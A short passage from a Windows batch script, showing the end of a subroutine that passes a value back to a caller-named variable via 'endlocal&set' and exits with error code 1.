		endlocal&set "%1=%var%"
		exit /b 1
	)
)
